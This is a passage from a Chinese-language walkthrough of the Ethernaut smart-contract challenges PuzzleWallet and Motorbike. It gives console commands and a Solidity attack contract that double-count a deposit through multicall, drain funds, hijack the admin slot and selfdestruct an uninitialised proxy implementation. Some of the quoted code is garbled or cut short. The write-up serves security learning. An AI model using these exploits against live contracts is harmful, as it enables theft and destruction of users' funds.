        function addToWhitelist(address addr) external {
            require(msg.sender == owner, "Not the owner");
            whitelisted[addr] = true;
        }
        function deposit() external payable onlyWhitelisted {
          require(address(this).balance = value, "Insufficient balance");
            balances[msg.sender] = balances[msg.sender].sub(value);
            (bool success, ) = to.call{ value: value }(data);
            require(success, "Execution failed");
        }
        function multicall(bytes[] calldata data) external payable onlyWhitelisted {
            bool depositCalled = false;
            for (uint256 i = 0; i  写到这里莫名想到了前几天spring core
> rce那个修复ban了classloader关键字，然后使用class.module.classLoader绕过的方式。那个修复代码里使用的是对输入进行字符串比较，看输入内容是否含有classloader关键字，感觉跟这里比较函数选择器有点像。
按照上面的思路，我们调用`multicall`，且调用`deposit()`和`multicall(deposit())`函数，设定value值为0.001
ether，那么`balances[player]`就会加两次0.001 ether变成0.002 ether。但由于我们实际上只发送了0.001
ether，因此合约实际的余额`balanace`为0.002
ether，此时`balances[player]`和合约余额数值相等，因此再执行一次`execute`全部提款即可，具体代码如下：
    // 获取deposit()函数的签名
    depositData = await contract.methods["deposit()"].request().then(v => v.data)
    // 获取multicall(deposit())的签名
    multicallData = await contract.methods["multicall(bytes[])"].request([depositData]).then(v => v.data)
    // 调用2次deposit
    await contract.multicall([depositData, multicallData], {value: toWei('0.001')})
    //检查一下，可以发现balances[player]确实变成了0.002 ether
    fromWei((await contract.balances(player)).toString())
    // 直接取款即可
    await contract.execute(player,toWei('0.002'),0x0)
ok，余额清0，最后一步设定maxBalance
    await contract.setMaxBalance(player)
由于它跟admin在同一个slot上，因此成功设定了admin为我们的地址，pwned。这个题真是太牛逼了，触及我的多个知识盲区，主要是evm对函数和参数的底层编码不太了解，以及不太熟悉web3.js的api。
# 25 Motorbike
    // SPDX-License-Identifier: MIT
    pragma solidity  0) {
                (bool success,) = newImplementation.delegatecall(data);
                require(success, "Call failed");
            }
        }
        // Stores a new address in the EIP1967 implementation slot.
        function _setImplementation(address newImplementation) private {
            require(Address.isContract(newImplementation), "ERC1967: new implementation is not a contract");
            AddressSlot storage r;
            assembly {
                r_slot := _IMPLEMENTATION_SLOT
            }
            r.value = newImplementation;
        }
    }
这个题目算是上面题目的简单版本，本题的最终目的是要让合约执行`selfdestruct`函数自毁。get new
instance后，在控制台里交互的contract的地址，实际是`Motorbike`合约的地址，而`Engine`合约则被部署在了`_IMPLEMENTATION_SLOT`上，因此部署合约后，首先读一下`Engine`合约的地址
    slotaddr = '0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc'
    await web3.eth.getStorageAt(contract.address,slotaddr)
拿到`Engine`合约对应的地址为`0x1f4dbbf9fb6e962e74559832d2882451da91470a`，注意到这里有两个变量`upgrader`和`horsePower`，然后使用getStorageAt去读一下，发现它们内容都为0，说明此时`Engine`合约还没有执行
`initialize()`函数。因此，我们可以通过外部调用`Engine`合约的`initialize()`函数，来让`Engine`合约的upgrader变成我们的地址。
又由于`upgradeToAndCall`函数调用了`_upgradeToAndCall`函数，而`_upgradeToAndCall`内部执行了
    (bool success,) = newImplementation.delegatecall(data);
这里`newImplementation`和`data`都是完全可控的，因此在这里设置`newImplementation`为我们自定义的恶意合约地址，`data`设定为自毁函数的`function
seletor`值，由于`delegatecall`是在本函数的上下文执行的，因此执行远程函数代码中的`selfdestruct`时，这个合约就会自毁，从而达到题目条件。
思路如下，攻击代码如下:
    //SPDX-License-Identifier: MIT
    pragma solidity <0.7.0;
    contract attack{
        address target;
        constructor(address _addr)public{
            target=_addr;
        }
        function step1beupgrader()public{
            bool succ;
            (succ,)=target.call(abi.encodeWithSignature("initialize()"));
            require(succ,"step1 failed!");
        }
        function step2exp()public{
            bool succ;
            DestructContract destructContract = new DestructContract();
            (succ,)=target.call(abi.encodeWithSignature("upgradeToAndCall(address,bytes)",address(destructContract),abi.encodeWithSignature("sakai()")));
            require(succ,"step2 failed!");
        }
    }
    contract DestructContract{
        function sakai() external{
            selfdestruct(msg.sender);
        }
    }
执行`step1beupgrade`函数后，再去读`Engine`合约的storage值，可以看到slot
0，也就是upgrader确实变成了我们部署的合约的地址，而slot 1，也就是horsePower的值，确实变成了1000
然后执行`step2exp`，执行后查看`Engine`合约对应的地址，可以看到这里提示已经self destruct，攻击完成，提交即可。
完结撒花！